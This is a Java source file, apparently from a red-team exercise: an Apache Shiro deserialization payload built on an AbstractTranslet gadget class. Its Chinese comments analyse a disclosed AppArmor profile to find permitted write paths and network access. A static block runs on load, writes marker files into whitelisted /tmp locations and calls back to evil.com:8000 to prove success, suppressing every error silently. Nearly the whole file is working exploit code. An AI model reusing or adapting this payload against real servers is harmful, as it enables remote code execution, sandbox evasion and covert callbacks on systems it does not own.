import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

// RT-4 (AppArmor 轮) Shiro 武器：纯 Java、零 exec（aa-shiro 只放行 /usr/bin/java 的 x）。
// 白盒依据（disclosed profile aa-shiro）：
//   规则1: /tmp/tomcat* rw            -> 顶层 /tmp 文件名以 tomcat 开头即命中（* 匹配除 / 外任意字符）
//   规则2: /tmp/tomcat 斜杠星斜杠星 rw -> 已存在的 tomcat 点星 工作目录内容可写
//   规则3: /tmp/hsperfdata_root 下星 rw -> JVM perf 目录内容可写（live 证据：JVM 自身每 5s 更新）
//   规则4: network inet 全放行         -> HttpURLConnection 回连 infra（成功判据 b）
// 四个动作各自独立 try/catch，互不牵连；不落 /tmp 根（无 w 规则，R0 已证 DENIED）。
// 单 class、无内部类（byte[][] 单类组装，GenPwnRT 兼容）。
public class PwnAA extends AbstractTranslet {
    static {
        // a1: 顶层 /tmp 文件，名字走 /tmp/tomcat* 白名单 glob
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("/tmp/tomcatrt4_a1"), "rt4".getBytes("UTF-8"));
        } catch (Throwable t1) {
            // 静默
        }
        // a2: 已存在的 tomcat.* 工作目录内部（/tmp/tomcat*/**）
        try {
            java.io.File[] ents = new java.io.File("/tmp").listFiles();
            if (ents != null) {
                for (int i = 0; i < ents.length; i++) {
                    String n = ents[i].getName();
                    if (n.startsWith("tomcat") && ents[i].isDirectory()) {
                        try {
                            java.nio.file.Files.write(
                                new java.io.File(ents[i], "pwn_rt4_shiro_a2").toPath(),
                                "rt4".getBytes("UTF-8"));
                        } catch (Throwable t2in) {
                            // 静默
                        }
                    }
                }
            }
        } catch (Throwable t2) {
            // 静默
        }
        // a3: hsperfdata 目录内（/tmp/hsperfdata_root/**）
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("/tmp/hsperfdata_root/pwn_rt4_shiro_a3"),
                "rt4".getBytes("UTF-8"));
        } catch (Throwable t3) {
            // 静默
        }
        // a4: 网络回连 infra（判据 b）
        try {
            java.net.URL u = new java.net.URL("http://evil.com:8000/rt/rt4_shiro_a4");
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.getResponseCode();
        } catch (Throwable t4) {
            // 静默
        }
    }

    public PwnAA() {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {}
}
